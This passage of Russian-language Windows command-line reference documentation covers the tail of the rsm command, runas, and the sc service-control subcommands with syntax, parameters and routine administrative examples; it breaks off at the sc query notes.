    Задает тип носителя, который требуется обновить. Можно указать только код GUID. Этот параметр позволяет обновить состояния всех устройств чтения съемных носителей, указав код GUID съемного носителя. Этот код GUID можно определить командой «view» следующим образом: rsm view /tmedia_type /guiddisplay.
/?
    Отображает справку в командной строке.

Чтобы отобразить список объектов носителей
Синтаксис

rsm view /t{drive|library|changer|storageslot|iedoor|ieport|physical_media| media_pool|partition|logical_media|media_type|drive_type|librequest}
rsm view [/cgкод_контейнера]
rsm view [/guiddisplay]
rsm view [/b]
Параметры

/t {drive|library|changer|storageslot|iedoor|ieport|physical_media| media_pool|partition|logical_media|media_type|drive_type|librequest}
    Выводит на экран список объектов ностелей указанного типа. При использовании без параметров будет выдан список всех пулов носителей системы съемных носителей (всех библиотек).
/cgкод_контейнера
    Задает код GUID контейнера объекта. Тип контейнера зависит от типа объекта (параметра), заданного в ключе /t. Если код контейнера не задан, будут выведена все экземпляры соответствующего типа объекта.
/guiddisplay
    Отображает код GUID и понятое имя для объектов.
/b
    Отображает только код GUID объекта для использования в сценариях.
/?
    Отображает справку в командной строке.

Примечания
- Если не используются ключи /guiddisplay и /b, отображаются только понятные имена объектов.
Примечания
- После успешного выполнения команды возвращается код ERROR_SUCCESS. Если команда по каким-либо причинам не выполнена, возвращается код ошибки, который можно использовать в сценариях. Код ошибки представляет собой либо системный код ошибки, либо один из кодов, указанных в таблице.
Код ошибки     Описание
536870913     Заданы неверные аргументы. Обычно эта ошибка бывает вызвана наличием пробела после параметра, например /t 50 вместо /t50
536870914     Заданы повторяющиеся параметры. Например, задана команда allocate с двумя параметрами /m
536870915     Указанному понятному имени не соответствует ни один код GUID. Проверьте правильность написания понятного имени с учетом регистра
536870916     Задано недостаточно параметров. Проверьте, не пропущен ли обязательный параметр
536870917     Задан неверный код GUID. Для определения правильного кода GUID воспользуйтесь командой view
536870918     Этот код возвращается только командой ejectatapi. Проверьте правильность работы сменщика ATAPI
========================================================================================
Runas

Запускает конкретные средства и программы с разрешениями, отличными от тех, которые предоставляет текущая учетная запись.
Синтаксис

runas [{/profile|/noprofile}] [/env] [/netonly] [/smartcard] [/showtrustlevels] [/trustlevel] /user:учетная_запись_пользователя program
Параметры

/profile
    Загружает профиль пользователя. Параметр /profile используется по умолчанию.
/no profile
    Определяет, что профиль пользователя не надо загружать. Это позволяет загрузить приложение быстрее, но также может привести к сбоям в некоторых приложениях. 
/env
    Задает использование текущей сетевой среды вместо локальной среды пользователя. 
/netonly
    Показывает использование введенных сведений о пользователе только для удаленного доступа.
/smartcard
    Определяет необходимость поддержки учетных данных с помощью смарт-карты. 
/showtrustlevels
    Выводит список параметров /trustlevel.
/trustlevel
    Указывает уровень проверки подлинности, на котором необходимо выполнить приложение. Используйте параметр /showtrustlevels для просмотра доступных уровней доверия. 
/user:учетная_запись_пользователя
    Задает имя учетной записи пользователя, которая будет использована для запуска программы. Учетная запись пользователя должна быть представлена в формате пользователь@домен или домен\пользователь.
program
    Задает команду или программу, которая будет запущена с помощью учетной записи, указанной в параметре /user.
/?
    Отображает справку в командной строке.

Примечания
-Администраторам рекомендуется использовать учетную запись с ограниченными разрешениями для выполнения повседневных задач, не связанных с администрированием, и учетную запись с более широкими правами только для выполнения отдельных административных задач. Чтобы реализовать такой подход без выхода из системы и повторного входа, войдите в систему с обычной учетной записью и используйте команду runas для запуска программ, требующих более широких прав. - Примеры использования команды runas см. по ссылке «». - Использование команды runas не ограничено административными учетными записями, хотя именно такой способ является наиболее употребительным. Любой пользователь с несколькими учетными записями может использовать runas для запуска программы, консоли MMC или компонента панели управления с другими личными данными.- Если необходимо использовать учетную запись администратора на своем компьютере, в качестве параметра /user: введите одно из следующих значений:

/user:учетная_запись_администратора@имя_компьютера

/user:имя_компьютера\учетная_запись_администратора
- Чтобы использовать данную команду в качестве администратора домена, введите одно из следующих значений параметра:

/user:учетная_запись_администратора@имя_домена

/user:имя_домена\учетная_запись_администратора
- С помощью команды runas можно выполнять программы (*.exe), запускать сохраненные консоли MMC (*.msc), ярлыки программ и сохраненных консолей MMC и компоненты панели управления. Их можно запускать в качестве администратора, даже если вход в систему был произведен с учетной записью члена другой группы, например группы пользователей или опытных пользователей.- Можно использовать команду runas для запуска любой программы, консоли MMC или компонента панели управления. Поскольку указываются соответствующие сведения об имени пользователя и его пароле, учетная запись пользователя предоставляет возможность подключения к компьютеру, а программа, консоль MMC или компонент панели управления становятся доступными в системе для учетной записи пользователя.- Команда runas позволяет администрировать сервер в другом лесе (компьютер, с которого запускается программа, и сервер располагаются в разных доменах).- При попытке запуска программы, консоли MMC или компонента контрольной панели из сети с помощью runas выполнение может окончиться неудачей, поскольку личные сведения, использованные для подключения к сетевому ресурсу, могут отличаться от тех, что использованы при запуске программы. Личные сведения, использованные при запуске программы, могут не позволить получить доступ к тому же сетевому ресурсу.- Некоторые компоненты, например папка «Принтеры» и элементы рабочего стола, открываются косвенно. Эти компоненты не могут быть запущены командой runas.- Если выполнение команды runas заканчивается неудачей, может оказаться, что служба вторичного входа не запущена или используемая учетная запись пользователя недопустима. Чтобы проверить состояние службы вторичного входа, в компоненте «Управление компьютером» щелкните узел Службы и приложения, а затем — Службы. Чтобы проверить учетную запись пользователя, попытайтесь подключиться к соответствующему домену с помощью этой учетной записи.
Примеры

Чтобы в качестве администратора на локальном компьютере запустить экземпляр интерпретатора командной строки , введите команду:
runas /user:имя_локального_компьютера\administrator cmd

После запроса введите пароль администратора.

Чтобы запустить экземпляр оснастки «Управление компьютером», используя учетную запись администратора домена companydomain\domainadmin, введите команду:
runas /user:companydomain\domainadmin "mmc %windir%\system32\compmgmt.msc"

После запроса введите пароль соответствующей учетной записи.

Чтобы запустить экземпляр блокнота, используя учетную запись администратора домена user в домене domain.microsoft.com, введите команду:
runas /user:user@domain.microsoft.com "notepad my_file.txt"

После запроса введите пароль соответствующей учетной записи.

Чтобы запустить экземпляр окна командной строки, сохраненную консоль MMC, компонент панели управления или программу, которая будет администрировать сервер в другом лесе, введите команду:
runas /netonly /user:домен\имя_пользователя "команда"

В параметре домен\имя_пользователя должен быть указан пользователь с разрешениями, достаточными для администрирования сервера. После запроса введите пароль соответствующей учетной записи.
========================================================================================
SC

Взаимодействует с контроллером служб и установленными службами. SC.exe извлекает и задает сведения об управлении службами. Программа SC.exe используется для тестирования и отладки служебных программ. Параметры службы, хранящиеся в реестре, можно настроить так, чтобы контролировать запуск приложений службы во время загрузки и их выполнение как фоновых процессов. С помощью параметров SC.exe имеется возможность настроить конкретную службу, отобразить текущее состояние службы, остановить и запустить службу. Чтобы автоматизировать запуск и завершение работы последовательности служб, создаются пакетные файлы, вызывающие различные команды SC.exe. SC.exe предоставляет возможности, сходные с возможностями средства «Службы» в элементе «Администрирование» панели управления.

Для просмотра синтаксиса команды щелкните одну из следующих команд sc.

sc boot

Определяет сохранение последней загрузки как последней удачной конфигурации.
Синтаксис

sc [имя_сервера] boot [{bad|OK}]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC (Universal Naming Convention) ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
[{bad|OK}]
    Определяет последнюю загрузку как неудачную или задает сохранение последней загрузки в качестве последней удачной конфигурации.
/?
    Отображает справку в командной строке.

Примеры

Далее приведены примеры использования команды sc boot.

sc boot ok
sc boot bad

sc config

Изменяет значение записей службы в реестре и в базе данных диспетчера служб.
Синтаксис

sc [имя_сервера] config [имя_службы] [type= {own|share|kernel|filesys|rec|adapt|interact type= {own|share}}] [start= {boot|system|auto|demand|disabled}] [error= {normal|severe|critical|ignore}] [binpath= имя_двоичного_пути] [group= группа_порядка_загрузки] [tag= {yes|no}] [depend= зависимости] [obj= {имя_учетной_записи|имя_объекта}] [displayname= отображаемое_имя] [password= пароль]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC (Universal Naming Convention) ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
type= {own|share|kernel|filesys|rec|adapt|interact type= {own|share}}
    Указывает тип службы.
    Значение     Описание
    own     Служба выполняется в собственном процессе. Она не использует исполняемый файл совместно с другими службами. Эта установка используется по умолчанию
    share     Служба выполняется как общий процесс. Она использует исполняемый файл совместно с другими службами
    kernel     Драйвер
    filesys     Драйвер файловой системы
    rec     Драйвер, определяющий файловую систему (указывает файловые системы, используемые на компьютере)
    adapt     Драйвер устройства (определяет элементы оборудования, например клавиатуру, мышь или дисковод)
    interact     Служба может взаимодействовать с рабочим столом, получая входные данные от пользователей. Интерактивные службы должны выполняться с системной учетной записью. Этот тип должен использоваться вместе с type= own или type= shared (например, type= interact type= own). Самостоятельное использование типа type= interact приведет к ошибке недопустимого параметра
start= {boot|system|auto|demand|disabled}
    Указывает тип запуска для службы.
    Значение     Описание
    boot     Драйвер устройства, который загружается загрузчиком системы.
    system     Драйвер устройства, который запускается при инициализации ядра.
    auto     Служба, которая автоматически запускается при каждой перезагрузке компьютера и даже в том случае, если на компьютер не вошел ни один пользователь
    demand     Служба, которая должна запускаться вручную. Это значение используется по умолчанию, если не указан параметр start=
    disabled     Служба, которую нельзя запустить. Чтобы запустить отключенную службу, выберите другой тип запуска
error= {normal|severe|critical|ignore}
    Указывает серьезность ошибки, если служба не запускается при загрузке.
    Значение     Описание
    normal     Ошибка записывается в журнал и выводится окно сообщения, информирующее пользователя об отказе при запуске службы. Запуск будет продолжен. Это устанавливается по умолчанию
    severe     Ошибка заносится в журнал (если это возможно). Компьютер пытается перезагрузиться в последней удачной конфигурации. Компьютер можно будет перезагрузить, но выполнить службу, возможно, не удастся
    critical     Ошибка заносится в журнал (если это возможно). Компьютер пытается перезагрузиться в последней удачной конфигурации. Если имеет место отказ последней правильной конфигурации, запуск также приведет к отказу и процесс загрузки остановится на ошибке
    ignore     Ошибка заносится в журнал и запуск продолжается. Ошибка записывается в журнал ошибок и другие уведомления пользователю не выводятся
binpath= имя_двоичного_пути
    Указывает путь в двоичном файле службы 
group= группа_порядка_загрузки
    Указывает имя группы, членом которой является эта служба. Список групп сохраняется в реестре в подразделе HKLM\System\CurrentControlSet\Control\ServiceGroupOrder. Значение по умолчанию является пустым
tag= {yes|no}
    Указывает, следует ли получить код TagID из вызова CreateService. Теги используются только драйверами, запускающимися при загрузке или запуске системы
depend= зависимости
    Указывает имена служб и групп, которые должны быть запущены раньше данной службы. Имена разделяются косой чертой (/)
obj= {имя_учетной_записи|имя_объекта}
    Указывает имя учетной записи, для которой будет выполняться служба, или имя объекта драйвера Windows, в котором будет запущен драйвер. По умолчанию установленое имя учетной записи — Локальная система.
displayname= отображаемое_имя
    Определяет понятное, точное имя для службы, которое используется в программах пользовательского интерфейса. Например, имя раздела службы «wuaserv» не очень понятно пользователю, а отображаемое имя — «Автоматическое обновление».
password= пароль
    Задает пароль. Данный параметр требуется при использовании учетной записи, отличной от учетной записи «Локальная система».
/?
    Отображает справку в командной строке.

Примечания
- Если между параметром и его значением имеется пробел (например type= own вместо type=own) произойдет сбой операции.
Примеры

Далее приведены примеры использования команды sc config.

sc config NewService binpath= "ntsd -d c:\windows\system32\NewServ.exe"

sc continue

Чтобы возобновить остановленную службу, отправляет службе запрос CONTINUE.
Синтаксис

sc [имя_сервера] continue [имя_службы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
/?
    Отображает справку в командной строке.

Примечания
- Используйте операцию continue для возобновления работы остановленной службы.
Примеры

Далее приведены примеры использования команды sc continue.

sc continue tapisrv

sc control

Отправляет службе код CONTROL B.
Синтаксис

sc [имя_сервера] control [имя_службы] [{paramchange|netbindadd|netbindremove|netbindenable|netbinddisable|пользовательский_управляющий_код}]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
{paramchange|netbindadd|netbindremove|netbindenable|netbinddisable|пользовательский_управляющий_код}
    Задает управляющий код, который посылается службе.
/?
    Отображает справку в командной строке.

sc create

Создает раздел и записи службы в реестре и в базе данных диспетчера служб.
Синтаксис

sc [имя_сервера] create [имя_службы] [type= {own|share|kernel|filesys|rec|adapt|interact type= {own|share}}] [start= {boot|system|auto|demand|disabled}] [error= {normal|severe|critical|ignore}] [binpath= имя_двоичного_пути] [group= группа_порядка_загрузки] [tag= {yes|no}] [depend= зависимости] [obj= {имя_учетной_записи|имя_объекта}] [displayname= отображаемое_имя] [password= пароль]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
type= {own|share|kernel|filesys|rec|adapt|interact type= {own|share}}
    Указывает тип службы. Тип по умолчанию type= own.
    Значение     Описание
    own     Служба выполняется в собственном процессе. Она не использует исполняемый файл совместно с другими службами. Эта установка используется по умолчанию
    share     Служба выполняется как общий процесс. Она использует исполняемый файл совместно с другими службами
    kernel     Драйвер
    filesys     Драйвер файловой системы
    rec     Драйвер, определяющий файловую систему (указывает файловые системы, используемые на компьютере)
    interact     Служба может взаимодействовать с рабочим столом, получая входные данные от пользователей. Интерактивные службы должны выполняться с системной учетной записью. Этот тип должен использоваться вместе с type= own или type= shared (например, type= interact type= own). Самостоятельное использование типа type= interact приведет к ошибке недопустимого параметра
start= {boot|system|auto|demand|disabled}
    Указывает тип запуска для службы. Тип запуска по умолчанию start= demand.
    boot     Драйвер устройства, который загружается загрузчиком системы
    system     Драйвер устройства, который запускается при инициализации ядра
    auto     Служба, которая автоматически запускается при каждой перезагрузке компьютера и даже в том случае, если на компьютер не вошел ни один пользователь
    demand     Служба, которая должна запускаться вручную. Это значение используется по умолчанию, если не указан параметр start=
    disabled     Служба, которую нельзя запустить. Чтобы запустить отключенную службу, выберите другой тип запуска
error= {normal|severe|critical|ignore}
    Указывает серьезность ошибки, если служба не запускается при загрузке. Значение параметра по умолчанию error= normal.
    normal     Ошибка записывается в журнал и выводится окно сообщения, информирующее пользователя об отказе при запуске службы. Запуск будет продолжен. Это устанавливается по умолчанию
    severe     Ошибка заносится в журнал (если это возможно). Компьютер пытается перезагрузиться в последней удачной конфигурации. Компьютер можно будет перезагрузить, но выполнить службу, возможно, не удастся
    critical     Ошибка заносится в журнал (если это возможно). Компьютер пытается перезагрузиться в последней удачной конфигурации. Если имеет место отказ последней правильной конфигурации, запуск также приведет к отказу и процесс загрузки остановится на ошибке
    ignore     Ошибка заносится в журнал и запуск продолжается. Ошибка записывается в журнал ошибок и другие уведомления пользователю не выводятся
binpath= имя_двоичного_пути
    Указывает путь в двоичном файле службы. Значение по умолчанию для параметра binpath= не задано. Эту строку необходимо указать. 
group= группа_порядка_загрузки
    Указывает имя группы, членом которой является эта служба. Список групп сохраняется в реестре в подразделе HKLM\System\CurrentControlSet\Control\ServiceGroupOrder. Значение по умолчанию является пустым.
tag= {yes|no}
    Указывает, следует ли получить код TagID из вызова CreateService. Теги используются только драйверами, запускающимися при загрузке или запуске системы.
depend= зависимости
    Указывает имена служб и групп, которые должны быть запущены раньше данной службы. Имена разделяются косой чертой (/).
obj= {имя_учетной_записи|имя_объекта}
    Указывает имя учетной записи, для которой будет выполняться служба, или имя объекта драйвера Windows, в котором будет запущен драйвер
displayname= отображаемое_имя
    Определяет понятное, точное имя для службы, которое используется в программах пользовательского интерфейса.
password= пароль
    Задает пароль. Данный параметр требуется при использовании учетной записи, отличной от учетной записи «Локальная система».
/?
    Отображает справку в командной строке.

Примечания
- Если между параметром и его значением имеется пробел (например type= own вместо type=own) произойдет сбой операции.
Примеры

Далее приведены примеры использования команды sc create.

sc \\myserver create NewService binpath= c:\windows\system32\NewServ.exe
sc create NewService binpath= c:\windows\system32\NewServ.exe type= share start= auto depend= "+TDI Netbios"

sc delete

Удаляет раздел службы из реестра. Если служба выполняется или другой процесс использует эту службу, она помечается для удаления.
Синтаксис

sc [имя_сервера] delete [имя_службы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
/?
    Отображает справку в командной строке.

Примечания
- Для удаления служб DHCP, DNS и других встроенных в операционную систему служб используйте средство «Установка и удаление программ». Средство «Установка и удаление программ» не только удаляет раздел реестра для службы, но и службу, и ярлыки этой службы.
Примеры

Далее приведены примеры использования команды sc delete.

sc delete newserv

sc description

Задает строку описания для службы.
Синтаксис

sc [имя_сервера] description [имя_службы] [описание]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
описание
    Задает описание для конкретной службы. Если строка не указана, описание службы не изменяется. Количество символов в строке описания службы неограниченно.
/?
    Отображает справку в командной строке.

Примеры

Далее приведены примеры использования команды sc description.

sc description newserv "Runs quality of service control."

sc enumdepend

Выводит список служб, которые не могут выполнятся, пока запущена определенная служба.
Синтаксис

sc [имя_сервера] enumdepend [имя_службы] [размер_буфера]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
размер_буфера
    Задает размер буфера перечисления в байтах. Значение по умолчанию равно 1024 байта.
/?
    Отображает справку в командной строке.

Примечания
- Если размер буфера небольшой, операция enumdepend выводит зависимости только частично и указывает размер дополнительного буфера, который необходим для вывода всех зависимостей. Запустите операцию повторно и укажите больший размер буфера, если вывод обрезается.
Примеры

Далее приведены примеры использования команды sc enumdepend.

sc enumdepend rpcss 5690
sc enumdepend tapisrv

sc failure

Определяет действия, которые надо предпринять при сборе работы службы.
Синтаксис

sc [имя_сервера] failure [имя_службы] [reset= интервал_без_ошибок] [reboot= широковещательное_сообщение] [command= командная_строка] [actions= действия_при_сбое_и_время_задержки]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
reset= интервал_без_ошибок
    Задает период времени работы службы без ошибок (в секундах), после которого счетчик ошибок сбрасывается в 0. Данный параметр должен использоваться совместно с параметром actions=.
reboot= широковещательное_сообщение
    Определяет сообщение для широковещательной рассылки при сбое работы службы.
command= командная_строка
    Определяет командную строку для запуска при сбое работы службы. Дополнительные сведения о запуске пакетных и VBS файлов при сбое см. разделе «Примечания».
actions= действия_при_сбое_и_время_задержки
    Указывает действия при сбое и время задержки (в миллисекундах), отделенные косой чертой (/). Допустимы следующие действия: run, restart и reboot. Этот ключ не может быть использован с параметром reset=. Чтобы не предпринимать никаких действий при сбое, используйте параметр actions= "".
/?
    Отображает справку в командной строке.

Примечания
- Изменить параметры при сбое можно не для всех служб. Некоторые из них выполняются как набор служб.- Чтобы запустить пакетный файл после сбоя, укажите в параметре command=: cmd.exe диск:\имя_файла.bat, где диск:\имя_файла.bat — полное имя пакетного файла. - Чтобы запустить файл VBS после сбое, для параметра command= укажите следующее: диск:\мой_сценарий.vbs, где диск:\мой_сценарий.vbs — полное имя файла сценария.- По возможности определите три различных действия для параметра actions=, которые будут использоваться при первом, втором и третьем отказах службы.- Если между параметром и его значением имеется пробел (например type= own вместо type=own) произойдет сбой операции.
Примеры

Далее приведены примеры использования команды sc failure.

sc failure msftpsvc reset= 30 actions= restart/5000
sc failure dfs reset= 60 command= c:\windows\services\restart_dfs.exe actions= run/5000
sc failure dfs reset= 60 actions= reboot/30000
sc failure dfs reset= 60 reboot= "Отказ работы службы распределенной файловой системы (DFS). Поэтому через 30 секунд будет произведена перезагрузка компьютера." actions= reboot/30000
sc failure myservice reset= 3600 reboot= "Сбой службы «MyService» — перезагрузка машины" command= "%windir%\MyServiceRecovery.exe" actions= restart/5000/run/10000/reboot/60000

sc getdisplayname

Получает отображаемое имя определенной службы.
Синтаксис

sc [имя_сервера] getdisplayname [имя_службы] [размер_буфера]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
размер_буфера
    Задает размер буфера в байтах. Значение по умолчанию равно 1024 байта.
/?
    Отображает справку в командной строке.

Примеры

Далее приведены примеры использования команды sc getdisplayname.

sc getdisplayname clipsrv
sc getdisplayname tapisrv
sc getdisplayname sharedaccess

sc getkeyname

Выводит имя раздела, соответствующего определенной службы, используя отображаемое имя как входящие данные.
Синтаксис

sc [имя_сервера] getkeyname [отображаемое_имя_службы] [размер_буфера]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
отображаемое_имя_службы
    Указывает отображаемое имя службы.
размер_буфера
    Задает размер буфера в байтах. Значение по умолчанию равно 1024 байта.
/?
    Отображает справку в командной строке.

Примечания
- Если отображаемое_имя_службы содержит пробелы, его следует заключать в кавычки (т. е. "отображаемое имя службы").
Примеры

Далее приведены примеры использования команды sc getkeyname.

sc getkeyname "удаленный вызов процедур (rpc)"
sc getkeyname "общий доступ к подключению к Интернету"
sc getkeyname "папка обмена"

sc interrogate

Посылает службе запрос INTERROGATE.
Синтаксис

sc [имя_сервера] interrogate [имя_службы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
/?
    Отображает справку в командной строке.

Примечания
- Отправление запроса INTERROGATE влечет за собой обновление состояния службы с помощью диспетчера служб.
Примеры

Далее приведены примеры использования команды sc interrogate.

sc interrogate sharedaccess
sc interrogate rpcss

sc lock

Блокирует базу данных диспетчера служб.
Синтаксис

sc [имя_сервера] lock
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
/?
    Отображает справку в командной строке.

Примечания
- Блокирование базы данных диспетчера служб препятствует запуску любой службы. Используйте эту операцию, чтобы убедиться, что служба не будет запущена после остановки. Это позволяет выполнить некоторые действия (например, удалить службу) без помех.- Использование операции lock приводит к блокированию базы данных диспетчера служб; ввод u позволяет разблокировать базу данных. Имеется возможность удалить процесс, из которого была блокирована база данных.
Примеры

Далее приведены примеры использования команды sc lock.

sc lock

sc pause

Посылает службе запрос PAUSE.
Синтаксис

sc [имя_сервера] pause [имя_службы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
/?
    Отображает справку в командной строке.

Примечания
- Используйте операцию pause для приостановки службы перед завершением ее работы.- Не все службы могут быть приостановлены.- Не все службы выполняют одинаковые действия в процессе приостановки. Некоторые продолжают обслуживать текущих клиентов и отказываются принять новых. Другие службы прекращают обслуживать существующих клиентов и отказываются принять новых.
Примеры

Далее приведены примеры использования команды sc pause.

sc pause tapisrv

sc qc

Запрашивает сведения о конфигурации службы.
Синтаксис

sc [имя_сервера] qc [имя_службы] [размер_буфера]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
размер_буфера
    Задает размер буфера в байтах. Значение по умолчанию равно 1024 байта.
/?
    Отображает справку в командной строке.

Примечания
- С помощью операции qc на экран выводится следующая информация о службе: SERVICE_NAME (имя раздела реестра для службы), TYPE, ERROR_CONTROL, BINARY_PATH_NAME, LOAD_ORDER_GROUP, TAG, DISPLAY_NAME, DEPENDENCIES и SERVICE_START_NAME.-

Администратор может использовать SC, чтобы определить двоичное имя любой службы и выяснить, использует ли служба процесс совместно с другими службами. Для этого введите следующую команду:

sc qc имя_службы

С помощью SC можно сопоставить службы в узле «Службы» консоли ММС процессам в программе «Системный монитор». Если двоичное имя службы — Services.exe, значит, служба имеет общий доступ к процессу контроллера службы.

Services.exe запускает все службы. Чтобы сэкономить системные ресурсы, несколько служб Win32, разработанные для Windows, совместно используют процесс Services.exe. Эти службы не указаны в качестве отдельных процессов в средствах «Системный монитор» и «Диспетчер задач». Это верно и для процесса Svchost.exe, являющийся базовым процессом службы, который совместно используется множеством работающих служб.

Может не существовать процесса для каждой службы Win32, потому что третья часть этих служб настроена на совместное использование процессов. SC можно использовать для получения сведений о конфигурации этих служб. Если служба не использует процесс совместно с другими службами, в программе «Системный монитор» во время выполнения службы существует процесс для нее.
-

Команды SС полезны разработчикам служб, потому что предоставляют более подробные и точные сведения о службах, чем программа Services.exe, которая включена в Windows. Services.exe определяет запущена служба, остановлена или приостановлена. Хотя этих средств достаточно для отлаженного приложения, которое выполняется безошибочно, сведения, предоставляемые ими о разработанной службе, могут ввести в заблуждение. Например, служба, которая запускается, отображена как запущенная, независимо от того, действительно ли она выполняется или нет.

SC реализует вызовы ко всем функциям интерфейса API управления службами Windows. Настроить параметры для этих функций можно, задав их в командной строке.

С помощью средства SC имеется возможность запросить состояние службы и получить значения, хранящиеся в полях структуры состояний. Services.exe не выводит полное состояние службы, а средства SC отображают точное состояние службы, а также номер последней контрольной точки и сведения о состоянии ожидания. Контрольную точку можно использовать как средство отладки, потому что она показывает путь инициализации до момента, когда программа перестала отвечать. SC позволяет задавать имя удаленного компьютера, что дает возможность вызвать функции интерфейса API службы и посмотреть структуры состояния службы на удаленном компьютере.
Примеры

Далее приведены примеры использования команды sc qc.

sc qc \\myserver newsrvice
sc qc rpcss 248

sc qdescription

Выводит на экран строку описания службы.
Синтаксис

sc [имя_сервера] qdescription [имя_службы] [размер_буфера]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
размер_буфера
    Задает размер буфера в байтах. Значение по умолчанию равно 1024 байта.
/?
    Отображает справку в командной строке.

Примеры

Далее приведены примеры использования команды sc qdescription.

sc qdescription rpcss
sc qdescription rpcss 138

sc qfailure

Выводит на экран действия, которые будут выполняться при отказе работы службы.
Синтаксис

sc [имя_сервера] qfailure [имя_службы] [размер_буфера]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname.
размер_буфера
    Задает размер буфера в байтах. Значение по умолчанию равно 1024 байта.
/?
    Отображает справку в командной строке.

Примечания
- Операция qfailure выводит на экран следующие сведения о службе: SERVICE_NAME (имя раздела реестра для службы), RESET_PERIOD, REBOOT_MESSAGE, COMMAND_LINE и FAILURE_ACTIONS.
Примеры

Далее приведены примеры использования команды sc qfailure.

sc qfailure rpcss
sc qfailure rpcss 20

sc query

Получает и отображает сведения о конкретной службе, драйвере, типе службы или типе драйвера.
Синтаксис

sc [имя_сервера] query [имя_службы] [type= {driver|service|all}] [type= {own|share|interact|kernel|filesys|rec|adapt}] [state= {active|inactive|all}] [bufsize= размер_буфера] [ri= индекс_возобновления] [group= имя_группы]
Параметры

имя_сервера
    Задает имя удаленного сервера, на котором находится служба. В имени следует использовать формат UNC ("\\myserver"). Чтобы запустить SC локально, этот параметр следует пропустить.
имя_службы
    Указывает имя службы, возвращенное операцией getkeyname. Данный параметр операции query не используется совместно с другими параметрами этой операции (отличными от параметра имя_сервера).
type= {driver|service|all}
    Указывает объекты для перечисления. Тип по умолчанию service.
    Значение     Описание
    driver     Указывает перечисление только драйверов
    service     Указывает перечисление только служб
    all     Указывает перечисление драйверов и служб
type= {own|share|interact|kernel|filesys|rec|adapt}
    Указывает тип драйверов и тип служб для перечисления.
    Значение     Описание
    own     Служба выполняется в собственном процессе. Она не использует исполняемый файл совместно с другими службами. Эта установка используется по умолчанию
    share     Служба выполняется как общий процесс. Она использует исполняемый файл совместно с другими службами
    interact     Служба может взаимодействовать с рабочим столом, получая входные данные от пользователей. Интерактивные службы должны выполняться с системной учетной записью
    kernel     Драйвер
    filesys     Драйвер файловой системы
state= {active|inactive|all}
    Указывает состояние запуска службы, которая включается в перечисление. По умолчанию active.
    Значение     Описание
    active     Указывает все активные службы
    inactive     Указывает все приостановленные или остановленные службы
    all     Указывает все службы
bufsize= размер_буфера
    Задает размер буфера перечисления в байтах. По умолчанию размер пакета равен 1024 байтам. Увеличьте размер буфера перечисление, когда вывод результатов запроса превышает 1024 байтов.
ri= индекс_возобновления
    Указывает номер индекса, с которого начинается или возобновляется перечисление. Номер по умолчанию равен 0. Когда в ответ на запрос выведено больше сведений, чем буфер может отобразить по умолчанию, используйте данный параметр совместно с параметром bufsize=.
group= имя_группы
    Указывает группу служб для перечисления. По умолчанию выбираются все группы.
/?
    Отображает справку в командной строке.

Примечания
